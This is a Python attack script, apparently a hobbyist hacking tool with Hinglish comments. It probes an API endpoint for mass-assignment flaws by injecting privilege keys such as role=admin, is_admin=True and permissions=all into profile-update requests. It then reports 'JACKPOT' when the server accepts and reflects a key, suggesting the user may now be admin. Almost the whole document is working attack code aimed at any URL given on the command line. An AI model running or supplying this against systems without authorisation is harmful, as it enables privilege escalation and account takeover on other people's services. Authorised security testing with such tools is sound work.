import requests
import json
import sys
import copy

def scan_mass_assignment(target_url, method="PUT"):
    print(f"\n[*] Bhai, starting API Mass Assignment (JSON Injector) Scan on -> {target_url}")
    print("[*] Goal: Injecting hidden admin parameters to escalate privileges!\n")
    print("==================================================")

    # Yeh woh normal data hai jo ek aam user bhejta hai (Example)
    base_payload = {
        "username": "hacker_sammi",
        "email": "sammi@hack.com",
        "age": 25
    }

    # The Hacker's Dictionary of Privilege Keys
    # Yeh woh keys hain jo databases mein admin rights define karti hain
    evil_parameters = [
        {"role": "admin"},
        {"is_admin": True},
        {"permissions": "all"},
        {"account_type": "premium"},
        {"user_level": 1},
        {"admin": 1}
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Arch Linux x86_64) API-Hacker",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }

    print(f"[*] Base Payload: {json.dumps(base_payload)}")
    print(f"[*] Method: {method}\n")
    
    found_vuln = 0

    # Test har ek evil parameter ko base payload mein mix karke
    for evil_param in evil_parameters:
        # Base payload ki ek copy banate hain
        attack_payload = copy.deepcopy(base_payload)
        
        # Evil parameter ko normal data mein inject karte hain
        attack_payload.update(evil_param)
        
        evil_key = list(evil_param.keys())[0]
        print(f"[*] Injecting Poisoned Key -> '{evil_key}'")
        
        try:
            if method.upper() == "PUT":
                response = requests.put(target_url, json=attack_payload, headers=headers, timeout=5)
            else:
                response = requests.post(target_url, json=attack_payload, headers=headers, timeout=5)
            
            status = response.status_code
            resp_text = response.text.lower()
            
            # The Magic Logic: Bug Detection
            # Agar response mein 200/201 aata hai AUR humara injected parameter wapas reflect hota hai
            # iska matlab database ne hamari baat maan li hai!
            if status in [200, 201]:
                if str(evil_param[evil_key]).lower() in resp_text or evil_key.lower() in resp_text:
                    print(f"\n   [!!!] JACKPOT 🎯 MASS ASSIGNMENT VULNERABILITY LIKELY FOUND!")
                    print(f"   [!!!] We injected: {json.dumps(evil_param)}")
                    print(f"   [!!!] Server accepted it and returned HTTP {status}.")
                    print(f"   [!!!] You might have just escalated your privileges to Admin! Check your profile.\n")
                    found_vuln += 1
                else:
                    print(f"    [-] Server accepted request, but didn't reflect '{evil_key}'. Might be ignored.")
            else:
                print(f"    [-] Server rejected payload (HTTP {status}). Filter is active.")

        except requests.exceptions.RequestException as e:
            print(f"    [-] Connection Error: Skipped.")

    print("\n==================================================")
    if found_vuln > 0:
        print(f"[+] Scan Complete! Found {found_vuln} successful Mass Assignment injections! 💸")
    else:
        print("[-] Scan Complete. API correctly filters input parameters.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 api_mass_assign.py <API_Endpoint_URL> [POST/PUT]")
        print("Example: python3 api_mass_assign.py http://api.target.com/v1/update_profile PUT")
        sys.exit(1)
        
    target = sys.argv[1]
    req_method = sys.argv[2] if len(sys.argv) > 2 else "PUT"
    
    scan_mass_assignment(target, req_method)
